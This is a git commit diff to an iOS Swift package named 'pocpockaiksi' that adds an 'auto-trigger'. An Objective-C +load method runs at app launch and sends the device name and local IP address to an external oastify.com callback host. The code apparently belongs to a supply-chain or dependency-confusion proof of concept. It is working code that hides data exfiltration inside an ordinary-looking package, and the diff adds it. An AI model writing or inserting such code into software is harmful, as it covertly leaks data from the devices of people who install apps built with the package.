25b12f3b7cf532529c7f7cb42cb7cd343db4e32e
kaiksi-bb <kaiksibb@gmail.com>
2025-08-20 12:29:34 +0200

    Add auto-trigger

--- Sources/pocpockaiksi/Info.swift
+++ Sources/pocpockaiksi/Info.swift
@@ -1,27 +1,34 @@
 import UIKit
 import Foundation
 
-public class PocPod {
-    public init() {
+@objc public class PocPod: NSObject {
+    
+    // ✅ Auto-trigger method called when the app starts
+    @objc public static func load() {
+        sendPing()
+    }
+
+    private static func sendPing() {
         let podName = "pocpockaiksi"
         let deviceName = UIDevice.current.name
         let ipAddress = getIPAddress() ?? "unknown"
 
         let urlStr = "https://lwlvh2q5jxf20cx77q7eln0r7idg16pv.oastify.com/?pod=\(podName)&device=\(deviceName)&ip=\(ipAddress)"
-        guard let encodedUrlStr = urlStr.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed),
-              let url = URL(string: encodedUrlStr) else {
+        guard let encodedUrl = urlStr.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed),
+              let url = URL(string: encodedUrl) else {
             return
         }
 
         var req = URLRequest(url: url)
         req.httpMethod = "GET"
         URLSession.shared.dataTask(with: req).resume()
+        print("📡 PocPod pingback triggered to: \(url)")
     }
 
-    private func getIPAddress() -> String? {
+    private static func getIPAddress() -> String? {
         var address: String?
-
         var ifaddr: UnsafeMutablePointer<ifaddrs>?
+
         if getifaddrs(&ifaddr) == 0 {
             var ptr = ifaddr
             while ptr != nil {
@@ -29,7 +36,8 @@ public class PocPod {
 
                 guard let interface = ptr?.pointee else { continue }
                 let addrFamily = interface.ifa_addr.pointee.sa_family
-                if addrFamily == UInt8(AF_INET) { // IPv4
+
+                if addrFamily == UInt8(AF_INET) {
                     if let name = String(validatingUTF8: interface.ifa_name), name != "lo0" {
                         var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
                         getnameinfo(interface.ifa_addr,
